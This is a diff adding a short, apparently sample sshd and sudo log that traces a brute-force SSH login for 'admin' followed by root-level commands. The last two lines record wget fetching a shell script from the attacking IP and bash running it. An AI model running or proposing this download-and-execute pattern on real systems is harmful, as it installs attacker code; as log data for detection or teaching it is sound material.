@@ -1,0 +1,7 @@
+Aug 25 10:30:01 server sshd: Failed password for admin from 185.23.45.67
+Aug 25 10:30:05 server sshd: Failed password for admin from 185.23.45.67
+Aug 25 10:30:09 server sshd: Failed password for admin from 185.23.45.67
+Aug 25 10:30:14 server sshd: Accepted password for admin from 185.23.45.67
+Aug 25 10:30:20 server sshd[4123]: Accepted publickey for admin from 185.23.45.67 port 22 ssh2
+Aug 25 10:31:02 server sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/usr/bin/wget http://185.23.45.67/x.sh -O /tmp/x.sh
+Aug 25 10:31:40 server sudo:   admin : TTY=pts/0 ; PWD=/tmp ; USER=root ; COMMAND=/bin/bash /tmp/x.sh
